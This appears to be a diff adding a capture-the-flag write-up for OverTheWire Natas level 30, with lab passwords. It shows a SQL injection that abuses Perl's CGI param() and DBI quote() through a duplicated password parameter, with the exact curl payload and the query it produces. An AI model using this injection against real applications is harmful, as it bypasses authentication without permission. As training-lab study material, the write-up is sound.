@@ -3542,7 +3542,7 @@ And the password for natas29 is `31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns`.
 
 Don’t use **ECB** mode for encryption, as it allows block-swapping attacks. Use secure modes like **CBC** or **GCM** instead.
 
-## Level 29
+### Level 29
 
 - **Date**: 2026-04-30 (solved, not documented)
 - **URL**: `http://natas29.natas.labs.overthewire.org`
@@ -3684,7 +3684,101 @@ Don't pass user input into shell-interpreted file operations.
 - **Date**: 2026-04-30 (solved, not documented)
 - **URL**: `http://natas30.natas.labs.overthewire.org`
 - **Password**: `WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH`
-- **Tools**: Web Browser, `curl`, `Perl`
+- **Tools**: Web Browser, `curl`, `Perl`, `SQL`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<h1>natas30</h1>
+<div id="content">
+
+<form action="index.pl" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's view the source code!
+```perl
+END
+
+if ('POST' eq request_method && param('username') && param('password')){
+    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
+    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password'));
+
+    my $sth = $dbh->prepare($query);
+    $sth->execute();
+    my $ver = $sth->fetch();
+    if ($ver){
+        print "win!<br>";
+        print "here is your result:<br>";
+        print @$ver;
+    }
+    else{
+        print "fail :(";
+    }
+    $sth->finish();
+    $dbh->disconnect();
+}
+
+print <<END;
+```
+
+The query looks safe because it uses `quote()`.
+
+However, `CGI::param()` behaves unexpectedly when multiple parameters with the same name (like `password`) are supplied.
+Instead of returning a single value, it returns a list (of `password` values).
+
+This becomes interesting because `quote()` also accepts multiple arguments.
+If the second argument is a numeric datatype, `quote()` treats the first value as **numeric** input and does **not escape quotes**.
+
+We abuse this by sending two `password` parameters:
+
+```powershell
+curl.exe -X POST `
+  -u "natas30:WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" `
+  -d "username=natas28" `
+  -d "password='whatever' or 1" `
+  -d "password=4" `
+  "http://natas30.natas.labs.overthewire.org/index.pl"
+```
+
+Here, `4` is passed as the second argument to `quote()`, so the first value is treated as numeric.
+This causes `quote()` to treat our injected payload as numeric data, so the quotes are not escaped.
+
+Output:
+```html
+<br>here is your result:<br>natas31m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
+```
+
+It worked!
+
+The injected query effectively becomes:
+```sql
+SELECT * FROM users WHERE username='natas28' AND password='whatever' OR 1
+```
+
+Since `OR 1` is always true, the authentication check is bypassed.
+
+And the password for natas31 is `m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y`.
+
+#### The Lesson
+
+Don't rely on `quote()` alone to prevent SQL injection, because unexpected input handling can still change how values are processed.
+
+## Levels 31-34
+
+### Level 31
+
+- **Date**: 2026-04-30 (solved, not documented)
+- **URL**: `http://natas31.natas.labs.overthewire.org`
+- **Password**: `m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y`
+- **Tools**: Web Browser
 
 #### The Solution
 
